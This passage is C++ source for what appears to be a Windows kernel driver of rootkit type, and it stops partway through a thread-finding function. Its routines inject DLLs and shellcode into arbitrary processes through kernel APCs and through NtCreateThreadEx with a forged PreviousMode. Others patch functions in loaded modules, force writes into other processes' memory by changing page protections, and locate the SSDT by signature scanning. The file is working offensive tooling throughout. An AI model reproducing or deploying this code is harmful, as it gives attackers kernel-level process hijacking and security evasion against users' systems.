#include "pch.h"
#include "MemoryUtils.hpp"

MemoryUtils::MemoryUtils() {
	this->NtCreateThreadEx = NULL;
	this->ssdt = NULL;

	if (NT_SUCCESS(GetSSDTAddress()))
		this->NtCreateThreadEx = (tNtCreateThreadEx)GetSSDTFunctionAddress("NtCreateThreadEx");
}

/*
* Description:
* InjectDllAPC is responsible to inject a dll in a certain usermode process with APC.
*
* Parameters:
* @DllInfo [DllInformation*] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectDllAPC(DllInformation* DllInfo) {
	ShellcodeInformation ShellcodeInfo{};
	PVOID shellcode = NULL;
	SIZE_T shellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	NTSTATUS status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &shellcode, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		return status;
	shellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	// Filling the shellcode from the template.
	status = KeWriteProcessMemory(&shellcodeTemplate, PsGetCurrentProcess(), shellcode, shellcodeSize, KernelMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = KeWriteProcessMemory(&(DllInfo->DllPath), PsGetCurrentProcess(), (PUCHAR)shellcode + PATH_OFFSET, sizeof(DllInfo->DllPath), KernelMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Creating the shellcode information for APC injection.
	ShellcodeInfo.Parameter1 = NULL;
	ShellcodeInfo.Parameter2 = NULL;
	ShellcodeInfo.Parameter3 = NULL;
	ShellcodeInfo.Pid = DllInfo->Pid;
	ShellcodeInfo.Shellcode = shellcode;
	ShellcodeInfo.ShellcodeSize = DLL_INJ_SHELLCODE_SIZE;

	status = InjectShellcodeAPC(&ShellcodeInfo);

CleanUp:
	if (!NT_SUCCESS(status) && shellcode)
		ZwFreeVirtualMemory(ZwCurrentProcess(), &shellcode, &shellcodeSize, MEM_DECOMMIT);

	return status;
}

/*
* Description:
* InjectDllThread is responsible to inject a dll in a certain usermode process with NtCreateThreadEx.
*
* Parameters:
* @DllInfo [DllInformation*] -- All the information regarding the injected dll.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectDllThread(DllInformation* DllInfo) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid{};
	KAPC_STATE state;
	HANDLE hProcess = NULL;
	HANDLE hTargetThread = NULL;
	PEPROCESS TargetProcess = NULL;
	PVOID remoteAddress = NULL;
	HANDLE pid = UlongToHandle(DllInfo->Pid);
	SIZE_T pathLength = strlen(DllInfo->DllPath) + 1;
	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	KeStackAttachProcess(TargetProcess, &state);
	PVOID kernel32Base = GetModuleBase(TargetProcess, L"C:\\Windows\\System32\\kernel32.dll");

	if (!kernel32Base) {
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}

	PVOID loadLibraryAddress = GetFunctionAddress(kernel32Base, "LoadLibraryA");

	if (!loadLibraryAddress) {
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}
	KeUnstackDetachProcess(&state);

	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &pathLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		goto CleanUp;
	pathLength = strlen(DllInfo->DllPath) + 1;

	status = KeWriteProcessMemory(&(DllInfo->DllPath), TargetProcess, remoteAddress, pathLength, KernelMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
	CHAR tmpPreviousMode = *previousMode;
	*previousMode = KernelMode;
	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)loadLibraryAddress, remoteAddress, 0, NULL, NULL, NULL, NULL);
	*previousMode = tmpPreviousMode;

CleanUp:
	if (hTargetThread)
		ZwClose(hTargetThread);

	if (!NT_SUCCESS(status) && remoteAddress)
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &pathLength, MEM_DECOMMIT);

	if (hProcess)
		ZwClose(hProcess);

	if (TargetProcess)
		ObDereferenceObject(TargetProcess);

	return status;
}

/*
* Description:
* InjectShellcodeAPC is responsible to inject a shellcode in a certain usermode process.
*
* Parameters:
* @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
*
* Returns:
* @status		 [NTSTATUS]				 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectShellcodeAPC(ShellcodeInformation* ShellcodeInfo) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid{};
	HANDLE hProcess = NULL;
	PEPROCESS TargetProcess = NULL;
	PETHREAD TargetThread = NULL;
	PKAPC ShellcodeApc = NULL;
	PKAPC PrepareApc = NULL;
	PVOID shellcodeAddress = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;

	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
	status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Find APC suitable thread.
	status = FindAlertableThread(pid, &TargetThread);

	if (!NT_SUCCESS(status) || !TargetThread) {
		if (NT_SUCCESS(status))
			status = STATUS_NOT_FOUND;
		goto CleanUp;
	}

	// Allocate and write the shellcode.
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = ZwAllocateVirtualMemory(hProcess, &shellcodeAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		goto CleanUp;
	shellcodeSize = ShellcodeInfo->ShellcodeSize;

	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, shellcodeAddress, shellcodeSize, UserMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Create and execute the APCs.
	ShellcodeApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
	PrepareApc = (PKAPC)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);

	if (!ShellcodeApc || !PrepareApc) {
		status = STATUS_UNSUCCESSFUL;
		goto CleanUp;
	}

	KeInitializeApc(PrepareApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)PrepareApcCallback, NULL, NULL, KernelMode, NULL);
	KeInitializeApc(ShellcodeApc, TargetThread, OriginalApcEnvironment, (PKKERNEL_ROUTINE)ApcInjectionCallback, NULL, (PKNORMAL_ROUTINE)shellcodeAddress, UserMode, ShellcodeInfo->Parameter1);

	if (!KeInsertQueueApc(ShellcodeApc, ShellcodeInfo->Parameter2, ShellcodeInfo->Parameter3, FALSE)) {
		status = STATUS_UNSUCCESSFUL;
		goto CleanUp;
	}

	if (!KeInsertQueueApc(PrepareApc, NULL, NULL, FALSE)) {
		status = STATUS_UNSUCCESSFUL;
		goto CleanUp;
	}

	if (PsIsThreadTerminating(TargetThread))
		status = STATUS_THREAD_IS_TERMINATING;

CleanUp:
	if (!NT_SUCCESS(status)) {
		if (shellcodeAddress)
			ZwFreeVirtualMemory(hProcess, &shellcodeAddress, &shellcodeSize, MEM_DECOMMIT);
		if (PrepareApc)
			ExFreePoolWithTag(PrepareApc, DRIVER_TAG);
		if (ShellcodeApc)
			ExFreePoolWithTag(ShellcodeApc, DRIVER_TAG);
	}

	if (TargetProcess)
		ObDereferenceObject(TargetProcess);

	if (hProcess)
		ZwClose(hProcess);

	return status;
}

/*
* Description:
* InjectShellcodeThread is responsible to inject a shellcode in a certain usermode process with NtCreateThreadEx.
*
* Parameters:
* @ShellcodeInfo [ShellcodeInformation*] -- All the information regarding the injected shellcode.
*
* Returns:
* @status  [NTSTATUS]		 -- Whether successfuly injected or not.
*/
NTSTATUS MemoryUtils::InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo) {
	OBJECT_ATTRIBUTES objAttr{};
	CLIENT_ID cid{};
	HANDLE hProcess = NULL;
	HANDLE hTargetThread = NULL;
	PEPROCESS TargetProcess = NULL;
	PVOID remoteAddress = NULL;
	SIZE_T shellcodeSize = ShellcodeInfo->ShellcodeSize;
	HANDLE pid = UlongToHandle(ShellcodeInfo->Pid);
	NTSTATUS status = PsLookupProcessByProcessId(pid, &TargetProcess);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	cid.UniqueProcess = pid;
	cid.UniqueThread = NULL;

	status = ZwOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	status = ZwAllocateVirtualMemory(hProcess, &remoteAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status))
		goto CleanUp;
	shellcodeSize = ShellcodeInfo->ShellcodeSize;

	status = KeWriteProcessMemory(ShellcodeInfo->Shellcode, TargetProcess, remoteAddress, shellcodeSize, UserMode);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Making sure that for the creation the thread has access to kernel addresses and restoring the permissions right after.
	InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
	PCHAR previousMode = (PCHAR)((PUCHAR)PsGetCurrentThread() + THREAD_PREVIOUSMODE_OFFSET);
	CHAR tmpPreviousMode = *previousMode;
	*previousMode = KernelMode;
	status = this->NtCreateThreadEx(&hTargetThread, THREAD_ALL_ACCESS, &objAttr, hProcess, (PTHREAD_START_ROUTINE)remoteAddress, NULL, 0, NULL, NULL, NULL, NULL);
	*previousMode = tmpPreviousMode;

CleanUp:
	if (hTargetThread)
		ZwClose(hTargetThread);

	if (!NT_SUCCESS(status) && remoteAddress)
		ZwFreeVirtualMemory(hProcess, &remoteAddress, &shellcodeSize, MEM_DECOMMIT);

	if (hProcess)
		ZwClose(hProcess);

	if (TargetProcess)
		ObDereferenceObject(TargetProcess);

	return status;
}

/*
* Description:
* PatchModule is responsible for patching a certain moudle in a certain process.
*
* Parameters:
* @ModuleInformation [PatchedModule*] -- All the information regarding the module that needs to be patched.
*
* Returns:
* @status			 [NTSTATUS]		  -- Whether successfuly patched or not.
*/
NTSTATUS MemoryUtils::PatchModule(PatchedModule* ModuleInformation) {
	PEPROCESS TargetProcess;
	KAPC_STATE state;

	PVOID functionAddress = NULL;
	PVOID moduleImageBase = NULL;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	// Copying the values to local variables before they are unaccesible because of KeStackAttachProcess.
	WCHAR* moduleName = (WCHAR*)ExAllocatePool(PagedPool, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));

	if (!moduleName)
		return status;
	memcpy(moduleName, ModuleInformation->ModuleName, (wcslen(ModuleInformation->ModuleName) + 1) * sizeof(WCHAR));

	CHAR* functionName = (CHAR*)ExAllocatePool(PagedPool, strlen(ModuleInformation->FunctionName) + 1);

	if (!functionName) {
		ExFreePool(moduleName);
		return status;
	}
	memcpy(functionName, ModuleInformation->FunctionName, strlen(ModuleInformation->FunctionName) + 1);

	if (PsLookupProcessByProcessId((HANDLE)ModuleInformation->Pid, &TargetProcess) != STATUS_SUCCESS) {
		ExFreePool(functionName);
		ExFreePool(moduleName);
		return status;
	}

	// Getting the PEB.
	KeStackAttachProcess(TargetProcess, &state);
	moduleImageBase = GetModuleBase(TargetProcess, moduleName);

	if (!moduleImageBase) {
		KdPrint((DRIVER_PREFIX "Failed to get image base.\n"));
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}

	functionAddress = GetFunctionAddress(moduleImageBase, functionName);

	if (!functionAddress) {
		KdPrint((DRIVER_PREFIX "Failed to get function's address.\n"));
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}
	KeUnstackDetachProcess(&state);

	status = KeWriteProcessMemory(ModuleInformation->Patch, TargetProcess, functionAddress, (SIZE_T)ModuleInformation->PatchLength, KernelMode);

	if (!NT_SUCCESS(status))
		KdPrint((DRIVER_PREFIX "Failed to patch function, (0x%08X).\n", status));

CleanUp:
	ExFreePool(moduleName);
	ExFreePool(functionName);
	ObDereferenceObject(TargetProcess);
	return status;
}

/*
* Description:
* KeWriteProcessMemory is responsible for writing data to any target process.
*
* Parameters:
* @sourceDataAddress [PVOID]	 -- The address of data to write.
* @TargetProcess	 [PEPROCESS] -- Target process to write.
* @targetAddress	 [PVOID]	 -- Target address to write.
* @dataSize			 [SIZE_T]	 -- Size of data to write.
* @mode			     [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
*
* Returns:
* @status			 [NTSTATUS]	 -- Whether successfuly written or not.
*/
NTSTATUS MemoryUtils::KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
	HANDLE hTargetProcess;
	ULONG oldProtection;
	SIZE_T patchLen;
	SIZE_T bytesWritten;
	NTSTATUS status = STATUS_SUCCESS;

	if (mode != KernelMode && mode != UserMode) {
		KdPrint((DRIVER_PREFIX "Invalid mode.\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Making sure that the given kernel mode address is valid.
	if (mode == KernelMode && (!VALID_KERNELMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
		status = STATUS_UNSUCCESSFUL;
		KdPrint((DRIVER_PREFIX "Invalid kernel source address or target address.\n"));
		return status;
	}
	else if (mode == UserMode && (!VALID_USERMODE_MEMORY((DWORD64)sourceDataAddress) || !VALID_ADDRESS((DWORD64)targetAddress))) {
		status = STATUS_UNSUCCESSFUL;
		KdPrint((DRIVER_PREFIX "Invalid user mode source address or target address.\n"));
		return status;
	}

	// Adding write permissions.
	status = ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to get process to handle.\n"));
		return status;
	}

	patchLen = dataSize;
	PVOID addressToProtect = targetAddress;
	status = ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, PAGE_READWRITE, &oldProtection);

	if (!NT_SUCCESS(status)) {
		KdPrint((DRIVER_PREFIX "Failed to change protection, (0x%08X).\n", status));
		ZwClose(hTargetProcess);
		return status;
	}
	ZwClose(hTargetProcess);

	// Writing the data.
	status = MmCopyVirtualMemory(PsGetCurrentProcess(), sourceDataAddress, TargetProcess, targetAddress, dataSize, KernelMode, &bytesWritten);

	if (!NT_SUCCESS(status))
		KdPrint((DRIVER_PREFIX "MmCopyVirtualMemory failed status, (0x%08X).\n", status));

	// Restoring permissions and cleaning up.
	if (ObOpenObjectByPointer(TargetProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, (KPROCESSOR_MODE)mode, &hTargetProcess) == STATUS_SUCCESS) {
		patchLen = dataSize;
		ZwProtectVirtualMemory(hTargetProcess, &addressToProtect, &patchLen, oldProtection, &oldProtection);
		ZwClose(hTargetProcess);
	}

	return status;
}

/*
* Description:
* KeReadProcessMemory is responsible for read data from any target process.
*
* Parameters:
* @Process		 [PEPROCESS] -- Process to read data from.
* @sourceAddress [PVOID]	 -- Address to read data from.
* @targetAddress [PVOID]     -- Address to read data to.
* @dataSize		 [SIZE_T]	 -- Size of data to read.
* @mode			 [MODE]		 -- Mode of the request (UserMode or KernelMode allowed).
*
* Returns:
* @status		 [NTSTATUS]	 -- Whether successfuly read or not.
*/
NTSTATUS MemoryUtils::KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode) {
	SIZE_T bytesRead;

	if (mode != KernelMode && mode != UserMode) {
		KdPrint((DRIVER_PREFIX "Invalid mode.\n"));
		return STATUS_UNSUCCESSFUL;
	}

	// Making sure that the given kernel mode address is valid.
	if (mode == KernelMode && !VALID_KERNELMODE_MEMORY((DWORD64)targetAddress)) {
		KdPrint((DRIVER_PREFIX "Invalid kernel target address.\n"));
		return STATUS_UNSUCCESSFUL;
	}
	else if (mode == UserMode && !VALID_USERMODE_MEMORY((DWORD64)targetAddress)) {
		KdPrint((DRIVER_PREFIX "Invalid user mode target address.\n"));
		return STATUS_UNSUCCESSFUL;
	}

	return MmCopyVirtualMemory(Process, sourceAddress, PsGetCurrentProcess(), targetAddress, dataSize, KernelMode, &bytesRead);
}

/*
* Description:
* GetModuleBase is responsible for getting the base address of given module inside a given process.
*
* Parameters:
* @Process    [PEPROCESS] -- The process to search on.
* @moduleName [WCHAR*]	  -- Module's name to search.
*
* Returns:
* @moduleBase [PVOID]	  -- Base address of the module if found, else null.
*/
PVOID MemoryUtils::GetModuleBase(PEPROCESS Process, WCHAR* moduleName) {
	PVOID moduleBase = NULL;
	LARGE_INTEGER time = { 0 };
	time.QuadPart = -100ll * 10 * 1000;

	PREALPEB targetPeb = (PREALPEB)PsGetProcessPeb(Process);

	if (!targetPeb) {
		KdPrint((DRIVER_PREFIX "Failed to get PEB.\n"));
		return moduleBase;
	}

	for (int i = 0; !targetPeb->LoaderData && i < 10; i++) {
		KeDelayExecutionThread(KernelMode, FALSE, &time);
	}

	if (!targetPeb->LoaderData) {
		KdPrint((DRIVER_PREFIX "Failed to get LDR.\n"));
		return moduleBase;
	}

	// Getting the module's image base.
	for (PLIST_ENTRY pListEntry = targetPeb->LoaderData->InLoadOrderModuleList.Flink;
		pListEntry != &targetPeb->LoaderData->InLoadOrderModuleList;
		pListEntry = pListEntry->Flink) {

		PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (_wcsnicmp(pEntry->FullDllName.Buffer, moduleName, pEntry->FullDllName.Length / sizeof(wchar_t) - 4) == 0) {
			moduleBase = pEntry->DllBase;
			break;
		}
	}

	return moduleBase;
}

/*
* Description:
* GetFunctionAddress is responsible for getting the function address inside given module from its EAT.
*
* Parameters:
* @moduleBase      [PVOID] -- Module's image base address.
* @functionName    [CHAR*] -- Function name to search.
*
* Returns:
* @functionAddress [PVOID] -- Function address if found, else null.
*/
PVOID MemoryUtils::GetFunctionAddress(PVOID moduleBase, CHAR* functionName) {
	PVOID functionAddress = NULL;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;

	// Checking that the image is valid PE file.
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		KdPrint((DRIVER_PREFIX "DOS signature isn't valid.\n"));
		return functionAddress;
	}

	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)moduleBase + dosHeader->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		KdPrint((DRIVER_PREFIX "NT signature isn't valid.\n"));
		return functionAddress;
	}

	IMAGE_OPTIONAL_HEADER optionalHeader = ntHeaders->OptionalHeader;

	if (optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) {
		KdPrint((DRIVER_PREFIX "There are no exports.\n"));
		return functionAddress;
	}

	// Iterating the export directory.
	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PUCHAR)moduleBase + optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	DWORD* addresses = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfFunctions);
	WORD* ordinals = (WORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNameOrdinals);
	DWORD* names = (DWORD*)((PUCHAR)moduleBase + exportDirectory->AddressOfNames);

	for (DWORD j = 0; j < exportDirectory->NumberOfNames; j++) {
		if (_stricmp((char*)((PUCHAR)moduleBase + names[j]), functionName) == 0) {
			functionAddress = (PUCHAR)moduleBase + addresses[ordinals[j]];
			break;
		}
	}

	return functionAddress;
}

/*
* Description:
* GetSSDTFunctionAddress is responsible for getting the SSDT's location.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
*/
PVOID MemoryUtils::GetSSDTFunctionAddress(CHAR* functionName) {
	KAPC_STATE state;
	PEPROCESS CsrssProcess = NULL;
	PVOID functionAddress = NULL;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	ULONG infoSize = 0;
	ULONG index = 0;
	UCHAR syscall = 0;
	HANDLE csrssPid = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo) {
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
			originalInfo = NULL;
		}

		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!originalInfo)
			return functionAddress;

		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !originalInfo)
		goto CleanUp;

	// Using another info variable to avoid BSOD on freeing.
	info = originalInfo;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->ImageName.Buffer && info->ImageName.Length > 0) {
			if (_wcsicmp(info->ImageName.Buffer, L"csrss.exe") == 0) {
				csrssPid = info->UniqueProcessId;
				break;
			}
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	if (csrssPid == 0)
		goto CleanUp;
	status = PsLookupProcessByProcessId(csrssPid, &CsrssProcess);

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Attaching to the process's stack to be able to walk the PEB.
	KeStackAttachProcess(CsrssProcess, &state);
	PVOID ntdllBase = GetModuleBase(CsrssProcess, L"C:\\Windows\\System32\\ntdll.dll");

	if (!ntdllBase) {
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}
	PVOID ntdllFunctionAddress = GetFunctionAddress(ntdllBase, functionName);

	if (!ntdllFunctionAddress) {
		KeUnstackDetachProcess(&state);
		goto CleanUp;
	}

	// Searching for the syscall.
	while (((PUCHAR)ntdllFunctionAddress)[index] != RETURN_OPCODE) {
		if (((PUCHAR)ntdllFunctionAddress)[index] == MOV_EAX_OPCODE) {
			syscall = ((PUCHAR)ntdllFunctionAddress)[index + 1];
		}
		index++;
	}
	KeUnstackDetachProcess(&state);

	if (syscall != 0)
		functionAddress = (PUCHAR)this->ssdt->ServiceTableBase + (((PLONG)this->ssdt->ServiceTableBase)[syscall] >> 4);

CleanUp:
	if (CsrssProcess)
		ObDereferenceObject(CsrssProcess);

	if (originalInfo) {
		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		originalInfo = NULL;
	}

	return functionAddress;
}


/*
* Description:
* GetSSDTAddress is responsible for getting the SSDT's location.
*
* Parameters:
* There are no parameters.
*
* Returns:
* @status [NTSTATUS] -- STATUS_SUCCESS if found, else error.
*/
NTSTATUS MemoryUtils::GetSSDTAddress() {
	ULONG infoSize;
	PVOID ssdtRelativeLocation = NULL;
	PVOID ntoskrnlBase = NULL;
	PRTL_PROCESS_MODULES info = NULL;
	NTSTATUS status = STATUS_SUCCESS;
	UCHAR pattern[] = "\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7";

	// Getting ntoskrnl base first.
	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (info) {
			ExFreePoolWithTag(info, DRIVER_TAG);
			info = NULL;
		}

		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!info)
			return STATUS_INSUFFICIENT_RESOURCES;

		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !info)
		goto CleanUp;

	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;

	for (ULONG i = 0; i < info->NumberOfModules; i++) {
		if (NtCreateFile >= modules[i].ImageBase && NtCreateFile < (PVOID)((PUCHAR)modules[i].ImageBase + modules[i].ImageSize)) {
			ntoskrnlBase = modules[i].ImageBase;
			break;
		}
	}

	if (!ntoskrnlBase)
		goto CleanUp;

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntoskrnlBase;

	// Finding the SSDT address.
	status = STATUS_NOT_FOUND;
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		goto CleanUp;

	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntoskrnlBase + dosHeader->e_lfanew);

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		goto CleanUp;

	PIMAGE_SECTION_HEADER firstSection = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);

	for (PIMAGE_SECTION_HEADER section = firstSection; section < firstSection + ntHeaders->FileHeader.NumberOfSections; section++) {
		if (strcmp((const char*)section->Name, ".text") == 0) {
			ssdtRelativeLocation = FindPattern(pattern, 0xCC, sizeof(pattern) - 1, (PUCHAR)ntoskrnlBase + section->VirtualAddress, section->Misc.VirtualSize, NULL, NULL);

			if (ssdtRelativeLocation) {
				status = STATUS_SUCCESS;
				this->ssdt = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)ssdtRelativeLocation + *(PULONG)((PUCHAR)ssdtRelativeLocation + 3) + 7);
				break;
			}
		}
	}

CleanUp:
	if (info)
		ExFreePoolWithTag(info, DRIVER_TAG);
	return status;
}

/*
* Description:
* FindPattern is responsible for finding a pattern in memory range.
*
* Parameters:
* @pattern		  [PCUCHAR]	    -- Pattern to search for.
* @wildcard		  [UCHAR]		-- Used wildcard.
* @len			  [ULONG_PTR]	-- Pattern length.
* @base			  [const PVOID] -- Base address for searching.
* @size			  [ULONG_PTR]	-- Address range to search in.
* @foundIndex	  [PULONG]	    -- Index of the found signature.
* @relativeOffset [ULONG]		-- If wanted, relative offset to get from.
*
* Returns:
* @address		  [PVOID]	    -- Pattern's address if found, else 0.
*/
PVOID MemoryUtils::FindPattern(PCUCHAR pattern, UCHAR wildcard, ULONG_PTR len, const PVOID base, ULONG_PTR size, PULONG foundIndex, ULONG relativeOffset) {
	bool found;

	if (pattern == NULL || base == NULL || len == 0 || size == 0)
		return NULL;

	for (ULONG i = 0; i < size - len; i++) {
		found = true;

		for (ULONG j = 0; j < len; j++) {
			if (pattern[j] != wildcard && pattern[j] != ((PCUCHAR)base)[i + j]) {
				found = false;
				break;
			}
		}

		if (found) {
			if (foundIndex)
				*foundIndex = i;
			return (PUCHAR)base + i + relativeOffset;
		}
	}

	return NULL;
}

/*
* Description:
* FindAlertableThread is responsible for finding an alertable thread within a process.
*
* Parameters:
* @Process    [PEPROCESS] -- The process to search on.
*
* Returns:
* @Thread	  [PETHREAD]  -- PETHREAD object if found, else null.
*/
NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
	ULONG alertableThread;
	ULONG guiThread;
	PSYSTEM_PROCESS_INFO originalInfo = NULL;
	PSYSTEM_PROCESS_INFO info = NULL;
	ULONG infoSize = 0;
	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (originalInfo) {
			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
			originalInfo = NULL;
		}

		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!originalInfo)
			return STATUS_INSUFFICIENT_RESOURCES;

		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !originalInfo)
		goto CleanUp;
	status = STATUS_NOT_FOUND;

	// Using another info variable to avoid BSOD on freeing.
	info = originalInfo;

	// Iterating the processes information until our pid is found.
	while (info->NextEntryOffset) {
		if (info->UniqueProcessId == pid) {
			status = STATUS_SUCCESS;
			break;
		}
		info = (PSYSTEM_PROCESS_INFO)((PUCHAR)info + info->NextEntryOffset);
	}

	if (!NT_SUCCESS(status))
		goto CleanUp;

	// Finding a suitable thread.
	for (ULONG i = 0; i < info->NumberOfThreads; i++) {
		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThread())
			continue;

		status = PsLookupThreadByThreadId(info->Threads[i].ClientId.UniqueThread, Thread);

